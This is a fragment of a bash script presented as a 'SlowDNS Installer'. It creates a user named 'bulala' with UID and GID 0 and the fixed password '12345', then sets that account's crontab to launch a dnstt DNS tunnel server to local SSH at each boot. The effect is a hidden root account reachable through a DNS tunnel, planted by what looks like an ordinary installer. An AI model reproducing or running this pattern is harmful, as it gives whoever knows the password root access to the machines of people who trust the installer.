...
clear
echo -e "\e[1;32m-----------------------------------------------------"
echo -e "\e[1;32m           SlowDNS Installer by Dexter Eskalarte              "
echo -e "\e[1;32m-----------------------------------------------------"
...
clear
sleep 2
useradd -p $(openssl passwd -1 12345) bulala -ou 0 -g 0
sleep 2
export EDITOR=nano
sleep 2
crontab -r -u bulala
(crontab -l 2>/dev/null || true; echo "@reboot screen -dmS slowdns /etc/ppp/dnstt/dnstt-server/./dnstt-server -udp :53 -privkey-file /etc/ppp/server.key $domain 127.0.0.1:22") | crontab - -u bulala
sleep 2
